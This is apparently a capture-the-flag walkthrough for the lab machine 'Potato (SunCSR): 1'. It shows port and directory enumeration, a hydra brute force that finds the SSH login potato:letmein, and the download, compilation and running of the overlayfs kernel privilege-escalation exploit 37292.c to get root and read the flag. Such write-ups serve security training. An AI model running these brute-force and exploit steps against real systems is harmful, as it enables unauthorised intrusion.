# Potato (SunCSR): 1

* Name: Potato (SunCSR): 1
* Date release: 14 Sep 2020
* Author: SunCSR Team
* Series: Potato (SunCSR)
* Difficulty: Easy to Medium
* Tested: VMware Workstation 15.x Pro (This works better with VMware rather than VirtualBox)
* Goal: Get the root shell i.e.(`root@localhost:~#`) and then obtain flag under `/root`).

# Services enumeration

Nmap discovers 2 running services (provided you run a full scan with the `-p-` flag). SSH is running on a non standard port (`7120`).

~~~
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Potato
7120/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 b1:a8:49:bc:75:01:97:10:da:6a:fa:79:2f:12:41:30 (DSA)
|   2048 0d:6c:93:2a:1b:6c:10:bb:d4:01:4d:9c:42:34:36:df (RSA)
|   256 fc:96:d8:e5:a7:aa:d2:46:9b:00:bd:f2:be:45:cf:b5 (ECDSA)
|_  256 e3:b0:57:45:d3:83:44:45:af:3a:99:94:f8:25:a4:6c (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

# Web enumeration

Enumerating the web directory took me some time as I tried several dicionaries, without success.

~~~
kali@kali:/data/Potato_1$ gobuster dir -u http://potato.box -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://potato.box
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/22 07:44:35 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
/info.php (Status: 200)
===============================================================
2020/09/22 07:44:40 Finished
===============================================================
~~~

# SSH (7120)

Left without any other ideas, I decided to run a brute force account against a presumed `potato` account.

~~~
kali@kali:/data/Potato_1$ hydra -l potato -P /usr/share/wordlists/rockyou.txt ssh://potato.box:7120 -t 64
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-22 08:00:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://potato.box:7120/
[7120][ssh] host: potato.box   login: potato   password: letmein
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 57 final worker threads did not complete until end.
[ERROR] 57 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-22 08:01:28
~~~

This option was probably the right way to go, as hydra quickly found valid credentials: `potato:letmein`. Let's connect:

~~~
kali@kali:/data/Potato_1$ ssh potato@potato.box -p 7120
potato@potato.box's password: 
Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic x86_64)

 * Documentation:  https://help.ubuntu.com/
Last login: Tue Sep  8 02:04:57 2020 from 192.168.17.172
potato@ubuntu:~$ id
uid=1000(potato) gid=1000(potato) groups=1000(potato),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),110(sambashare)
~~~

# Privesc

The target is running a very old version of Linux, with a vulnerable kernel:

~~~
potato@ubuntu:~$ uname -a
Linux ubuntu 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
~~~

This leaves room for working exploits:

~~~
kali@kali:/data/src$ searchsploit ubuntu 3.13
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Pr | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Pr | linux/local/37293.txt
Linux Kernel 3.13/3.14 (Ubuntu) - 'splice()' System Call Local Denial of Service   | linux/dos/36743.c
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X32=y' Local Priv | linux_x86-64/local/31347.c
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.10) - 'CONFIG_X86_X32' Arbitrary Write (2)    | linux/local/31346.c
Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free               | linux/dos/43234.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation      | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation             | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privi | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escala | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Lo | linux/local/47169.c
Ubuntu < 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escala | linux/local/41760.txt
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
kali@kali:/data/src$ searchsploit -m 37292
  Exploit: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/37292
     Path: /usr/share/exploitdb/exploits/linux/local/37292.c
File Type: C source, ASCII text, with very long lines, with CRLF line terminators

Copied to: /data/src/37292.c

kali@kali:/data/src$ scp -P 7120 37292.c potato@potato.box:
potato@potato.box's password: 
37292.c
~~~

Now, on the target, let's compile and run the exploit:

~~~
potato@ubuntu:~$ gcc -o root 37292.c 
potato@ubuntu:~$ ./root 
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),110(sambashare),1000(potato)
~~~

# Root flag

~~~
# cd /root
# ls -la
total 24
drwx------  2 root root 4096 Sep  8 02:05 .
drwxr-xr-x 22 root root 4096 Sep  7 00:30 ..
-rw-------  1 root root  108 Sep  8 02:05 .bash_history
-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
-rw-r--r--  1 root root  140 Feb 19  2014 .profile
-rw-r--r--  1 root root   52 Sep  8 01:45 proof.txt
# cat proof.txt
SunCSR.Team.Potato.af6d45da1f1181347b9e2139f23c6a5b
~~~